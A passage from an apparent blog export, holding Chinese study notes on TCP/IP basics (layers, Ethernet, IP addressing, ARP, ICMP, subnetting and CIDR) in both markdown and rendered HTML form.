与办公室其他计算机组成局域网，使用专门的网关进行协议转换，接入Internet\n\nTCP/IP的特性，也是TCP/IP的核心：\n\n- 逻辑编址\n\n- 路由选择\n\n- 名称解析\n\n- 错误控制和流量控制\n\n- 应用支持\n\n缩写：\n\n- LAN：Local Area Network局域网\n- TCP：Transmission Control Protocal 传输控制协议\n- IP：Internet Protocal 网络协议\n\n### 2. 逻辑编址 ###\n\n术语：\n\n- 以太网：Ethernet 一种基带局域网规范，当今最通用的局域网标准\n- VPN：Virtual Private Network  虚拟专用网络\n- NAT：Network Address Transition网络地址转换\n\n网络适配器即网卡，出厂时都分配有一个物理地址，称为MAC地址，在LAN中，低层的与硬件相关的协议使用MAC地址在物理网络中传输数据。网卡监听LAN中的每一个传输，以确定消息是否发送到它的物理地址。\n\n网管使用如路由器的设备将网络分段，以减少网络拥堵。在路由式网络中，管理员需要一种细分网络到更小的子网的方法，TCP/IP通过逻辑编址提供了子网化能力，逻辑地址是一个通过网络软件来配置的地址，称为IP地址。\n\nIP地址包括：\n\n- 网络ID：识别网络\n\n- 子网ID：识别网络中的子网\n\n- 主机ID：识别子网中计算机的主机\n\nTCP/IP中使用ARP和RARP作IP地址与MAC地址的转换。\n\n- ARP：Address Resolution Protocal地址解析协议\n\n- RARP：Reverse-  逆向地址解析协议\n\n### 3.路由选择 ###\n\n路由器能够读取IP地址，将一个局域网连接到一个大型的网络上，可以减少网络拥塞。\n\nTCP/IP包括了定义路由器如何找到网络路径的协议。\n\n网桥、交换机和智能HUB等设备也都可以减少网络拥塞，但使用MAC地址而不是IP，因此不能执行复杂路由功能。\n\n### 4.名称解析\n\nTCP/IP提供IP的另一种结构，为域名系统，DNS Domain Name System，域名到IP的映射称为名称解析。域名服务器是一个专用计算机，存储域名和IP的映射表。\n\n### 5.错误控制和流量控制\n\nTCP/IP提供了确保数据在网络中可靠传送的特性。传输层定义了许多错误控制、流量控制和确认功能。\n\n### 6.应用支持\n\n一台计算机上可以运行多种网络程序，协议软件必须提供方法来判断接收到的数据包属于哪个程序。在TCP/IP中国年，这个通过系统的逻辑通道实现从网络到应用程序的接口被称为端口。可以把端口想象为计算机中的逻辑管道。\n\n### 7.标准组织和RFC\n\n- ICNN：互联网名称与数字地址分配机构\n- RFC：Request For Comments 请求评议，一系列以编号排定的文件，收集有关互联网的相关信息，被称为网络知识圣经。www.rfc-editor.org可以找到RFC\n\n## 二、TCP/IP的工作方式\n\n### 1.TCP/IP模型\n\n术语：\n\n- 网间：internetwork 指的是多个局域网互相连接形成的较大的网络\n\nTCP/IP协议系统划分为不同层次的组件，分别实现特定的功能，称为TCP/IP模型：\n\n- 应用层：网络服务 + 应用编程接口 + 网络应用程序和功能\n\n- 传输层：TCP+UDP 提供流量控制、错误控制和确认服务，充当应用程序的接口\n\n- 网际层：IP+ARP  实现物理地址与逻辑地址的转换，提供路由功能，支持网间的数据传递；\n\n- 网络访问层：提供与物理网络连接的接口\n\n### 2.OSI模型\n\n网络协议体系的标准的七层模型，称为OSI模型：开放互联模型，与TCP/IP是相互独立的，经常被作为一种通用框架来理解各种协议系统。\n\n在重要的传输层和网际层，OSI和TCP/IP模型是最相似的，这些层包含的组件最能体现网络协议之间的区别，所以很多协议根据其传输层和网络层进行命名。TCP/IP名称就来自于TCP（传输层协议）和IP（一个网际层协议）。\n\n应用层、表示层、会话层\t===》\t应用层\n\n传输层\t\t\t\t\t===》\t传输层\n\n网络层\t\t\t\t\t===》\t网际层\n\n数据链路层、物理层\t\t===》\t网络访问层\n\n### 3.数据包\n\n在数据发送过程中，其流程从TCP/IP四层模型堆栈的从上到下，每一层都把相关的信息（称为‘报头’）捆绑到实际数据上，包含包头信息和数据的数据包作为下一层的数据，再次被添加报头信息和重新打包。当数据到达目的计算机时，使用相关的过程一层层解包并最终使用其中的信息。\n\n前一个过程像俄罗斯套娃，在物理网络中如以太网，数据在网络访问层杯分解为较小的单元，像把套娃分解为碎片，把这些碎片封装到很小的娃娃里，再把他们以1和0的模式表示。接收端收到这些1和0之后，重新组合为小娃娃，再重建整个套娃。\n\n数据包在每一层的形式和名称：\n\n- **应用层**的数据包称为**消息**\n\n- **传输层**封装消息生成新的数据包，如果来自于传输层的TCP协议，就称为**分段**；如果来自UDP协议，就称为**数据报**\n\n- **网际层**封装传输层的分段生成的数据包，也称为**数据报**\n\n- **网络访问层**封装数据报生成的新数据包，称为**帧**，帧被访问层里的最低子层转化为**比特流**\n\nTCP与UDP的区别：\n\n- TCP是面向连接的协议，与无连接协议相比，能提供更复杂的流量控制和错误控制。TCP能确保数据的发送质量，比UDP更可靠，但比UDP的速度慢，因为要额外进行错误检测和流量控制。\n- UDP是个无连接的协议，比TCP快，但是不可靠，它把错误控制的责任推给了应用。\n\n## 三、TCP/IP模型之网络访问层\n\n网络访问层主要管理着对网络硬件的访问。它定义了与网络硬件交互和访问传输介质的过程。是TCP/IP协议栈中变化最多、最复杂的一层。一定要牢记：逻辑IP地址只存在于软件之中。\n\n**网络体系**：包含对物理网络的定义，及该物理网络上定义的通信规范，规范包含以下方面：访问方法、数据帧格式、布线类型、布线规则\n\n网络访问层包含如下网络体系：\n\n- IEEE802.3  \t以太网\t\t大多数办公室和家庭使用的基于线缆的局域网\n  - IEEE802.11无线网络\t\t即WIFI\n    - IEEE802.16WiMAX\t用于移动通信长距离无线网络技术\n      - 点到点协议PPP\tModem通过电话线连接的技术\n\n### 3.1以太网\n\n以太网是目前使用最广泛的局域网技术，在典型以太网上，所有计算机共享同个传输介质。使用CSMA/CD的方法（载波侦听多路访问／冲突检测），来判断计算机何时可以把数据发送到访问介质。\n\n**CSMA/CD**可以比喻为一个有很多人的房间。若有人想讲话，首先要确认目前是否有人在讲话（这就是**载波侦听**）。若两人同时开始讲话，他们都会发现这个问题，从而停止讲话，等一段时间再开始讲话（这就是**冲突检测**）。\n\n传统以太网在中低负载情况下运行良好，大负载下由于冲突增多而影响性能，现代以太网中会使用**网络交换机**对流量进行管理，以减少冲突。早期以太网中，所有计算机通过一条同轴线缆连接（就像电路串联），现代以太网中，每台计算机都连接到中央网络设备如**交换机**中，再由交换机接入Internet（就像电路串联）。\n\n以太帧的传输过程：\n\n网际层的数据==》{ 进入网络访问层：把数据分成块—>数据块打包成帧—>OSI模型物理层的底层组件把帧转换成比特流—>传输介质  }==》介质传输到别的网卡\n\n以太帧中包含**帧校验序列（FCS）**FCS是校验数据传输的常见方式，发送方计算帧的循环冗余码校验值（**CRC**值），把这个值写到帧里。接收方计算机重新计算CRC，与FCS字段的值进行比较，如果两个值不相同，就表示传输过程中发生了数据丢失或改变，就需要重新传输这一帧。\n\n## 四、TCP/IP模型之网际层\n\n一个网段（如一个以太局域网）上的计算机能够使用网络访问层提供的MAC地址进行通信，网际层提供的协议负责局域网网段之外的传递，**重要的协议包括IP、ARP和ICMP**（Internet Control Message Protocal 即Internet控制报文协议）。\n\n### 4.1寻址与发送\n\n在网络访问层，像以太网网卡对于上层协议一点不了解的，它只监听是否受到了数据帧，发现其中目标地址与自己物理地址相符的帧，并把这个帧传给上层协议栈，这种使用物理寻址的方式适合单个局域网网段。但在路由式网络中，不能利用物理地址实现数据传输，因此TCP/IP隐藏了物理地址，以一种逻辑化、层次化的寻址方案对网络进行组织。这种逻辑寻址方案由网际层的IP协议维护，因而逻辑地址被称为IP地址。\n\n在一个路由式网络中，TCP/IP软件使用如下策略在网络上发送数据：\n\n1. 如果目的地址与源地址在同个网段，源计算机直接把数据包发给目的计算机。IP地址被解析为物理地址，数据被直接发送到目的网卡\n\n2. 如果不在同个网段，就执行下列过程：\n\n   a. 直接将数据报发到网关，网关是局域网中的一个设备（网关也算是一个路由器），能把数据报转发到其他网段。网关地址被ARP解析为物理地址，数据被发送到网关的网络适配器。\n\n   b. 数据报通过网关被路由到较高级别的网段，再次重复上述过程，如果目的地址在这个新网段里，数据就被发送到目的，否则数据报就被发送到 另一个网关。\n\n   c. 数据报经过一系列网关被转发到目的网段。目的IP地址被ARP解析为物理地址，数据被发送到目的网络适配器。\n\n### 4.2网际协议（IP）\n\nIP协议提供了一种分层的、与硬件无关的寻址系统，TCP/IP网络上的每个网络适配器都有一个唯一的IP地址。通常计算机只有一个IP地址，是因为只有一个网卡，但作为路由器或代理服务器的计算机必须有多个网卡，因此有多个IP地址。\n\nIP地址包括两个部分：\n\n- 网络ID：像邮政编码，表明大致区域\n- 主机ID：像街道地址，表明区域内的准确位置\n\n1. IP报头字段\n\n   每个IP数据报都以一个IP报头开始，源计算机的TCP/IP软件构造这个IP报头，目的计算机的TCP/IP软件利用IP报头中封装的信息处理数据。\n\n   IP报头的最小长度是20字节，报头长度必须是32位字的整数倍，包含一系列字节，**跳数**代表数据报到达目的地之前必须经过的路由器的数量。\n\n2. IP寻址\n\n   IP地址是一个32位的地址，分为4个8位段，常用**点分十进制**来简化32位二进制地址。\n\n   **IP地址分类：**\n\n   A类地址：前8位表示网络ID，后24位表示主机ID，0～127\n\n   B类地址：前16位表示网络ID，后16位表示主机ID，128～191\n\n   C类地址：前24位表示网络ID，后8位表示主机ID，192～223\n\n   D类地址：用于多播，即把一个消息发送到网络的子网\n\n   E类地址：实验性质的，一般不用于生产环境，240～247\n\n   **子网：**\n\n   划分子网的实质是借用主机ID中的一些位，把网络划分为更小的次级网络。\n\n3. 特殊的IP地址\n\n   - 全0的主机ID表示网络本身，如129.152.0.0是指网络ID为129.152的B类网络。\n\n   - 全1的主机ID表示广播，即向网络中全部主机发送消息，如129.152.255.255就是网络ID为129.152的B类网络的广播地址。\n\n   - 地址255.255.255.255也可以用于网络上的广播。\n\n   - 以十进制127开头的地址是还回地址，目的地址为还回地址的消息是由本地TCP/IP软件发送的，目的在于测试TCP/IP软件是否工作正常，如Ping功能，通常使用的还回地址是127.0.0.1\n\n### 4.3 ARP（地址解析协议）与RARP（逆向-）\n\n网段上每台主机在内存中都保存着一个ARP表或称为ARP缓存的表格，其中包含着网段上其他主机的IP地址与物理地址的对应关系。当主机需要向网段上的其他主机发送数据时，他会查看ARP缓存来获得目的物理地址。ARP缓存是动态变化的，如果目的IP在缓存中找不到，主机就会发送一个名为**ARP请求帧**的广播。网段上的其他主机接收到这个ARP请求，拥有这个目的IP地址的主机会向发出请求的主机发送自己的物理地址，这个目的IP与物理地址的对应关系会添加到请求主机的ARP缓存里面。\n\nRARP常与BOOTP协议共同使用来启动无盘工作站。\n\n**BOOTP**：用来远程启动计算机或其它网络设备的协议。\n\n### 4.4 ICMP （Internet控制消息协议）\n\n发送到远程计算机的数据通常会经过多个路由器，这些路由器在把数据传输到最终目的地的过程中可能会发生多种问题，路由器利用ICMP消息把问题通知给源IP，ICMP还有其他调试和排错的功能。ICMP是用于诊断和测试的协议。常见ICMP消息：\n\n- Echo Request（回显请求）和Echo Reply（回显应答）\n\n  ICMP经常被用于测试，比如测试连接的ping命令实际上就是在使用ICMP。ping向某个IP地址发送一个数据报，并且要求目的计算机在响应中返回所发送的数据。ping实际使用的命令是ICMP的Echo Request和Echo Reply\n\n- Source Quench（源抑制）\n\n- Destination Unreachable（目的不可到达）\n\n- Time Exceeded（超时）\n\n- Fragmentation Needed（需要分段）\n\n## 五、子网划分和CIDR\n\n子网划分让数据报能够到达面向较小地址空间的路由器，最早源于地址分类系统。CIDR不需要关心地址类别。\n\n### 5.1网络划分\n\n像A类网络可以容纳超过1600万台主机，此时把网络划分为独立的物理网络能够增加网络的整体性能。子网划分就是在网络ID之下提供了第2层逻辑组织，路由器能把数据报发送给网络里的某个子网地址（一般对应于一个网段），当数据报到达子网之后，就会被ARB解析为物理地址。\n\nTCP/IP规定借用主机ID的一些位来形成子网地址，用**子网掩码**来指明地址中的多少位用于子网ID，保留多少位作为实际的主机ID。子网掩码也是32位的二进制值，每一位代表IP地址的一个位，**1表示IP地址中术语网络ID或子网ID的位，0表示属于主机ID的位**。可以把子网掩码看作阅读IP地址的映射。\n\n网管通常把子网掩码作为TCP/IP配置的参数分配给每个主机。一个子网内的所有主机应该具有相同的子网ID和子网掩码。\n\n### 5.2无类别域间路由CIDR\n\nIPv4即将耗尽，C类地址还有剩余，但地址空间比较小。使用一个CIDR前缀的值制定地址中作为网络ID的位数，这个前缀也被称为变长子网掩码VLSM，如在CIDR地址205.123.196183/25中，/25表示地址中25位用于网络ID，相应的子网掩码就是255.255.255.128。\n\nCIDR不仅可以对网络划分子网，还让ISP（Internet Service Provider）或管理员能够把多个连续C类网络聚合成一个实体。此时CIDR前缀发挥了**超网掩码**的作用。如ISP可以分配204.21.128.0～204.21.255.255的全部C类地址，这些网络地址的前17位是一样的，因此超网掩码是255.255.128.0。\n\n支持CIDR的路由表可以只使用一个CIDR条目204.21.128.0/17来引用这段地址的全部范围。该条目适用于与地址204.21.128.0的前17位匹配的所有地址。\n\n  \n\n\n\n","slug":"TCP-IP","published":1,"updated":"2018-08-04T03:56:44.739Z","_id":"cjgw444eu003i8d95f3xuhkty","layout":"post","photos":[],"link":"","content":"<p>本文是对《TCP/IP入门经典》前五章的梳理总结或者说一个读书笔记，主要说明了TCP/IP协议的基础知识、四层模型的结构、每层模型用到的协议，协议的主要内容等。由于篇幅关系，只写到了四层协议中的网络访问层和网际层，计划后续补全。阅读本文可以让你对于互联网的运行基础建立一个大概的印象，为深入了解TCP/IP协议打下基础。</p>\n<a id=\"more\"></a>\n<blockquote>\n<p>by MaryTien from <a href=\"http://luckymona.github.io\" target=\"_blank\" rel=\"noopener\">http://luckymona.github.io</a></p>\n</blockquote>\n<h2 id=\"一、什么是TCP-IP\"><a href=\"#一、什么是TCP-IP\" class=\"headerlink\" title=\"一、什么是TCP/IP\"></a>一、什么是TCP/IP</h2><h3 id=\"1-基础知识\"><a href=\"#1-基础知识\" class=\"headerlink\" title=\"1.基础知识\"></a>1.基础知识</h3><p>网络是计算机或类似计算机的设备之间通过常用传输介质进行通信的结合。网络协议就是一套通用功能规则，用来帮助定义复杂数据传输的过程。TCP/IP及其相关协议定义了完整的网络通信过程，被称为协议簇。</p>\n<ul>\n<li>TCP/IP标准定义了TCP/IP网络的通信规则；</li>\n<li>TCP/IP实现是一个软件组件，计算机通过它参与到TCP/IP网络中。</li>\n<li>TCP/IP标准的目的是确保所有厂商提供的TCP/IP实现都能很好地兼容。</li>\n</ul>\n<p>TCP/IP起源于美国国防部的ARPAnet网络，成为Internet比较成功的一部分，并提供两个重要特性：</p>\n<ul>\n<li>端点验证：两台实际通信的计算机都称为端点，位于信息链的末端，负责确认和验证传输，没有监视通信的中心模式</li>\n<li>动态路由选择</li>\n</ul>\n<p>个人计算机接入Internet的方法：</p>\n<ul>\n<li><p>使用modem拨号系统，它是通过一条电话线来提供网络连接的</p>\n</li>\n<li><p>与办公室其他计算机组成局域网，使用专门的网关进行协议转换，接入Internet</p>\n</li>\n</ul>\n<p>TCP/IP的特性，也是TCP/IP的核心：</p>\n<ul>\n<li><p>逻辑编址</p>\n</li>\n<li><p>路由选择</p>\n</li>\n<li><p>名称解析</p>\n</li>\n<li><p>错误控制和流量控制</p>\n</li>\n<li><p>应用支持</p>\n</li>\n</ul>\n<p>缩写：</p>\n<ul>\n<li>LAN：Local Area Network局域网</li>\n<li>TCP：Transmission Control Protocal 传输控制协议</li>\n<li>IP：Internet Protocal 网络协议</li>\n</ul>\n<h3 id=\"2-逻辑编址\"><a href=\"#2-逻辑编址\" class=\"headerlink\" title=\"2. 逻辑编址\"></a>2. 逻辑编址</h3><p>术语：</p>\n<ul>\n<li>以太网：Ethernet 一种基带局域网规范，当今最通用的局域网标准</li>\n<li>VPN：Virtual Private Network  虚拟专用网络</li>\n<li>NAT：Network Address Transition网络地址转换</li>\n</ul>\n<p>网络适配器即网卡，出厂时都分配有一个物理地址，称为MAC地址，在LAN中，低层的与硬件相关的协议使用MAC地址在物理网络中传输数据。网卡监听LAN中的每一个传输，以确定消息是否发送到它的物理地址。</p>\n<p>网管使用如路由器的设备将网络分段，以减少网络拥堵。在路由式网络中，管理员需要一种细分网络到更小的子网的方法，TCP/IP通过逻辑编址提供了子网化能力，逻辑地址是一个通过网络软件来配置的地址，称为IP地址。</p>\n<p>IP地址包括：</p>\n<ul>\n<li><p>网络ID：识别网络</p>\n</li>\n<li><p>子网ID：识别网络中的子网</p>\n</li>\n<li><p>主机ID：识别子网中计算机的主机</p>\n</li>\n</ul>\n<p>TCP/IP中使用ARP和RARP作IP地址与MAC地址的转换。</p>\n<ul>\n<li><p>ARP：Address Resolution Protocal地址解析协议</p>\n</li>\n<li><p>RARP：Reverse-  逆向地址解析协议</p>\n</li>\n</ul>\n<h3 id=\"3-路由选择\"><a href=\"#3-路由选择\" class=\"headerlink\" title=\"3.路由选择\"></a>3.路由选择</h3><p>路由器能够读取IP地址，将一个局域网连接到一个大型的网络上，可以减少网络拥塞。</p>\n<p>TCP/IP包括了定义路由器如何找到网络路径的协议。</p>\n<p>网桥、交换机和智能HUB等设备也都可以减少网络拥塞，但使用MAC地址而不是IP，因此不能执行复杂路由功能。</p>\n<h3 id=\"4-名称解析\"><a href=\"#4-名称解析\" class=\"headerlink\" title=\"4.名称解析\"></a>4.名称解析</h3><p>TCP/IP提供IP的另一种结构，为域名系统，DNS Domain Name System，域名到IP的映射称为名称解析。域名服务器是一个专用计算机，存储域名和IP的映射表。</p>\n<h3 id=\"5-错误控制和流量控制\"><a href=\"#5-错误控制和流量控制\" class=\"headerlink\" title=\"5.错误控制和流量控制\"></a>5.错误控制和流量控制</h3><p>TCP/IP提供了确保数据在网络中可靠传送的特性。传输层定义了许多错误控制、流量控制和确认功能。</p>\n<h3 id=\"6-应用支持\"><a href=\"#6-应用支持\" class=\"headerlink\" title=\"6.应用支持\"></a>6.应用支持</h3><p>一台计算机上可以运行多种网络程序，协议软件必须提供方法来判断接收到的数据包属于哪个程序。在TCP/IP中国年，这个通过系统的逻辑通道实现从网络到应用程序的接口被称为端口。可以把端口想象为计算机中的逻辑管道。</p>\n<h3 id=\"7-标准组织和RFC\"><a href=\"#7-标准组织和RFC\" class=\"headerlink\" title=\"7.标准组织和RFC\"></a>7.标准组织和RFC</h3><ul>\n<li>ICNN：互联网名称与数字地址分配机构</li>\n<li>RFC：Request For Comments 请求评议，一系列以编号排定的文件，收集有关互联网的相关信息，被称为网络知识圣经。<a href=\"http://www.rfc-editor.org可以找到RFC\" target=\"_blank\" rel=\"noopener\">www.rfc-editor.org可以找到RFC</a></li>\n</ul>\n<h2 id=\"二、TCP-IP的工作方式\"><a href=\"#二、TCP-IP的工作方式\" class=\"headerlink\" title=\"二、TCP/IP的工作方式\"></a>二、TCP/IP的工作方式</h2><h3 id=\"1-TCP-IP模型\"><a href=\"#1-TCP-IP模型\" class=\"headerlink\" title=\"1.TCP/IP模型\"></a>1.TCP/IP模型</h3><p>术语：</p>\n<ul>\n<li>网间：internetwork 指的是多个局域网互相连接形成的较大的网络</li>\n</ul>\n<p>TCP/IP协议系统划分为不同层次的组件，分别实现特定的功能，称为TCP/IP模型：</p>\n<ul>\n<li><p>应用层：网络服务 + 应用编程接口 + 网络应用程序和功能</p>\n</li>\n<li><p>传输层：TCP+UDP 提供流量控制、错误控制和确认服务，充当应用程序的接口</p>\n</li>\n<li><p>网际层：IP+ARP  实现物理地址与逻辑地址的转换，提供路由功能，支持网间的数据传递；</p>\n</li>\n<li><p>网络访问层：提供与物理网络连接的接口</p>\n</li>\n</ul>\n<h3 id=\"2-OSI模型\"><a href=\"#2-OSI模型\" class=\"headerlink\" title=\"2.OSI模型\"></a>2.OSI模型</h3><p>网络协议体系的标准的七层模型，称为OSI模型：开放互联模型，与TCP/IP是相互独立的，经常被作为一种通用框架来理解各种协议系统。</p>\n<p>在重要的传输层和网际层，OSI和TCP/IP模型是最相似的，这些层包含的组件最能体现网络协议之间的区别，所以很多协议根据其传输层和网络层进行命名。TCP/IP名称就来自于TCP（传输层协议）和IP（一个网际层协议）。</p>\n<p>应用层、表示层、会话层    ===》    应用层</p>\n<p>传输层                    ===》    传输层</p>\n<p>网络层                    ===》    网际层</p>\n<p>数据链路层、物理层        ===》    网络访问层</p>\n<h3 id=\"3-数据包\"><a href=\"#3-数据包\" class=\"headerlink\" title=\"3.数据包\"></a>3.数据包</h3><p>在数据发送过程中，其流程从TCP/IP四层模型堆栈的从上到下，每一层都把相关的信息（称为‘报头’）捆绑到实际数据上，包含包头信息和数据的数据包作为下一层的数据，再次被添加报头信息和重新打包。当数据到达目的计算机时，使用相关的过程一层层解包并最终使用其中的信息。</p>\n<p>前一个过程像俄罗斯套娃，在物理网络中如以太网，数据在网络访问层杯分解为较小的单元，像把套娃分解为碎片，把这些碎片封装到很小的娃娃里，再把他们以1和0的模式表示。接收端收到这些1和0之后，重新组合为小娃娃，再重建整个套娃。</p>\n<p>数据包在每一层的形式和名称：</p>\n<ul>\n<li><p><strong>应用层</strong>的数据包称为<strong>消息</strong></p>\n</li>\n<li><p><strong>传输层</strong>封装消息生成新的数据包，如果来自于传输层的TCP协议，就称为<strong>分段</strong>；如果来自UDP协议，就称为<strong>数据报</strong></p>\n</li>\n<li><p><strong>网际层</strong>封装传输层的分段生成的数据包，也称为<strong>数据报</strong></p>\n</li>\n<li><p><strong>网络访问层</strong>封装数据报生成的新数据包，称为<strong>帧</strong>，帧被访问层里的最低子层转化为<strong>比特流</strong></p>\n</li>\n</ul>\n<p>TCP与UDP的区别：</p>\n<ul>\n<li>TCP是面向连接的协议，与无连接协议相比，能提供更复杂的流量控制和错误控制。TCP能确保数据的发送质量，比UDP更可靠，但比UDP的速度慢，因为要额外进行错误检测和流量控制。</li>\n<li>UDP是个无连接的协议，比TCP快，但是不可靠，它把错误控制的责任推给了应用。</li>\n</ul>\n<h2 id=\"三、TCP-IP模型之网络访问层\"><a href=\"#三、TCP-IP模型之网络访问层\" class=\"headerlink\" title=\"三、TCP/IP模型之网络访问层\"></a>三、TCP/IP模型之网络访问层</h2><p>网络访问层主要管理着对网络硬件的访问。它定义了与网络硬件交互和访问传输介质的过程。是TCP/IP协议栈中变化最多、最复杂的一层。一定要牢记：逻辑IP地址只存在于软件之中。</p>\n<p><strong>网络体系</strong>：包含对物理网络的定义，及该物理网络上定义的通信规范，规范包含以下方面：访问方法、数据帧格式、布线类型、布线规则</p>\n<p>网络访问层包含如下网络体系：</p>\n<ul>\n<li>IEEE802.3      以太网        大多数办公室和家庭使用的基于线缆的局域网<ul>\n<li>IEEE802.11无线网络        即WIFI<ul>\n<li>IEEE802.16WiMAX    用于移动通信长距离无线网络技术<ul>\n<li>点到点协议PPP    Modem通过电话线连接的技术</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"3-1以太网\"><a href=\"#3-1以太网\" class=\"headerlink\" title=\"3.1以太网\"></a>3.1以太网</h3><p>以太网是目前使用最广泛的局域网技术，在典型以太网上，所有计算机共享同个传输介质。使用CSMA/CD的方法（载波侦听多路访问／冲突检测），来判断计算机何时可以把数据发送到访问介质。</p>\n<p><strong>CSMA/CD</strong>可以比喻为一个有很多人的房间。若有人想讲话，首先要确认目前是否有人在讲话（这就是<strong>载波侦听</strong>）。若两人同时开始讲话，他们都会发现这个问题，从而停止讲话，等一段时间再开始讲话（这就是<strong>冲突检测</strong>）。</p>\n<p>传统以太网在中低负载情况下运行良好，大负载下由于冲突增多而影响性能，现代以太网中会使用<strong>网络交换机</strong>对流量进行管理，以减少冲突。早期以太网中，所有计算机通过一条同轴线缆连接（就像电路串联），现代以太网中，每台计算机都连接到中央网络设备如<strong>交换机</strong>中，再由交换机接入Internet（就像电路串联）。</p>\n<p>以太帧的传输过程：</p>\n<p>网际层的数据==》{ 进入网络访问层：把数据分成块—&gt;数据块打包成帧—&gt;OSI模型物理层的底层组件把帧转换成比特流—&gt;传输介质  }==》介质传输到别的网卡</p>\n<p>以太帧中包含<strong>帧校验序列（FCS）</strong>FCS是校验数据传输的常见方式，发送方计算帧的循环冗余码校验值（<strong>CRC</strong>值），把这个值写到帧里。接收方计算机重新计算CRC，与FCS字段的值进行比较，如果两个值不相同，就表示传输过程中发生了数据丢失或改变，就需要重新传输这一帧。</p>\n<h2 id=\"四、TCP-IP模型之网际层\"><a href=\"#四、TCP-IP模型之网际层\" class=\"headerlink\" title=\"四、TCP/IP模型之网际层\"></a>四、TCP/IP模型之网际层</h2><p>一个网段（如一个以太局域网）上的计算机能够使用网络访问层提供的MAC地址进行通信，网际层提供的协议负责局域网网段之外的传递，<strong>重要的协议包括IP、ARP和ICMP</strong>（Internet Control Message Protocal 即Internet控制报文协议）。</p>\n<h3 id=\"4-1寻址与发送\"><a href=\"#4-1寻址与发送\" class=\"headerlink\" title=\"4.1寻址与发送\"></a>4.1寻址与发送</h3><p>在网络访问层，像以太网网卡对于上层协议一点不了解的，它只监听是否受到了数据帧，发现其中目标地址与自己物理地址相符的帧，并把这个帧传给上层协议栈，这种使用物理寻址的方式适合单个局域网网段。但在路由式网络中，不能利用物理地址实现数据传输，因此TCP/IP隐藏了物理地址，以一种逻辑化、层次化的寻址方案对网络进行组织。这种逻辑寻址方案由网际层的IP协议维护，因而逻辑地址被称为IP地址。</p>\n<p>在一个路由式网络中，TCP/IP软件使用如下策略在网络上发送数据：</p>\n<ol>\n<li><p>如果目的地址与源地址在同个网段，源计算机直接把数据包发给目的计算机。IP地址被解析为物理地址，数据被直接发送到目的网卡</p>\n</li>\n<li><p>如果不在同个网段，就执行下列过程：</p>\n<p>a. 直接将数据报发到网关，网关是局域网中的一个设备（网关也算是一个路由器），能把数据报转发到其他网段。网关地址被ARP解析为物理地址，数据被发送到网关的网络适配器。</p>\n<p>b. 数据报通过网关被路由到较高级别的网段，再次重复上述过程，如果目的地址在这个新网段里，数据就被发送到目的，否则数据报就被发送到 另一个网关。</p>\n<p>c. 数据报经过一系列网关被转发到目的网段。目的IP地址被ARP解析为物理地址，数据被发送到目的网络适配器。</p>\n</li>\n</ol>\n<h3 id=\"4-2网际协议（IP）\"><a href=\"#4-2网际协议（IP）\" class=\"headerlink\" title=\"4.2网际协议（IP）\"></a>4.2网际协议（IP）</h3><p>IP协议提供了一种分层的、与硬件无关的寻址系统，TCP/IP网络上的每个网络适配器都有一个唯一的IP地址。通常计算机只有一个IP地址，是因为只有一个网卡，但作为路由器或代理服务器的计算机必须有多个网卡，因此有多个IP地址。</p>\n<p>IP地址包括两个部分：</p>\n<ul>\n<li>网络ID：像邮政编码，表明大致区域</li>\n<li>主机ID：像街道地址，表明区域内的准确位置</li>\n</ul>\n<ol>\n<li><p>IP报头字段</p>\n<p>每个IP数据报都以一个IP报头开始，源计算机的TCP/IP软件构造这个IP报头，目的计算机的TCP/IP软件利用IP报头中封装的信息处理数据。</p>\n<p>IP报头的最小长度是20字节，报头长度必须是32位字的整数倍，包含一系列字节，<strong>跳数</strong>代表数据报到达目的地之前必须经过的路由器的数量。</p>\n</li>\n<li><p>IP寻址</p>\n<p>IP地址是一个32位的地址，分为4个8位段，常用<strong>点分十进制</strong>来简化32位二进制地址。</p>\n<p><strong>IP地址分类：</strong></p>\n<p>A类地址：前8位表示网络ID，后24位表示主机ID，0～127</p>\n<p>B类地址：前16位表示网络ID，后16位表示主机ID，128～191</p>\n<p>C类地址：前24位表示网络ID，后8位表示主机ID，192～223</p>\n<p>D类地址：用于多播，即把一个消息发送到网络的子网</p>\n<p>E类地址：实验性质的，一般不用于生产环境，240～247</p>\n<p><strong>子网：</strong></p>\n<p>划分子网的实质是借用主机ID中的一些位，把网络划分为更小的次级网络。</p>\n</li>\n<li><p>特殊的IP地址</p>\n<ul>\n<li><p>全0的主机ID表示网络本身，如129.152.0.0是指网络ID为129.152的B类网络。</p>\n</li>\n<li><p>全1的主机ID表示广播，即向网络中全部主机发送消息，如129.152.255.255就是网络ID为129.152的B类网络的广播地址。</p>\n</li>\n<li><p>地址255.255.255.255也可以用于网络上的广播。</p>\n</li>\n<li><p>以十进制127开头的地址是还回地址，目的地址为还回地址的消息是由本地TCP/IP软件发送的，目的在于测试TCP/IP软件是否工作正常，如Ping功能，通常使用的还回地址是127.0.0.1</p>\n</li>\n</ul>\n</li>\n</ol>\n<h3 id=\"4-3-ARP（地址解析协议）与RARP（逆向-）\"><a href=\"#4-3-ARP（地址解析协议）与RARP（逆向-）\" class=\"headerlink\" title=\"4.3 ARP（地址解析协议）与RARP（逆向-）\"></a>4.3 ARP（地址解析协议）与RARP（逆向-）</h3><p>网段上每台主机在内存中都保存着一个ARP表或称为ARP缓存的表格，其中包含着网段上其他主机的IP地址与物理地址的对应关系。当主机需要向网段上的其他主机发送数据时，他会查看ARP缓存来获得目的物理地址。ARP缓存是动态变化的，如果目的IP在缓存中找不到，主机就会发送一个名为<strong>ARP请求帧</strong>的广播。网段上的其他主机接收到这个ARP请求，拥有这个目的IP地址的主机会向发出请求的主机发送自己的物理地址，这个目的IP与物理地址的对应关系会添加到请求主机的ARP缓存里面。</p>\n<p>RARP常与BOOTP协议共同使用来启动无盘工作站。</p>\n<p><strong>BOOTP</strong>：用来远程启动计算机或其它网络设备的协议。</p>\n<h3 id=\"4-4-ICMP-（Internet控制消息协议）\"><a href=\"#4-4-ICMP-（Internet控制消息协议）\" class=\"headerlink\" title=\"4.4 ICMP （Internet控制消息协议）\"></a>4.4 ICMP （Internet控制消息协议）</h3><p>发送到远程计算机的数据通常会经过多个路由器，这些路由器在把数据传输到最终目的地的过程中可能会发生多种问题，路由器利用ICMP消息把问题通知给源IP，ICMP还有其他调试和排错的功能。ICMP是用于诊断和测试的协议。常见ICMP消息：</p>\n<ul>\n<li><p>Echo Request（回显请求）和Echo 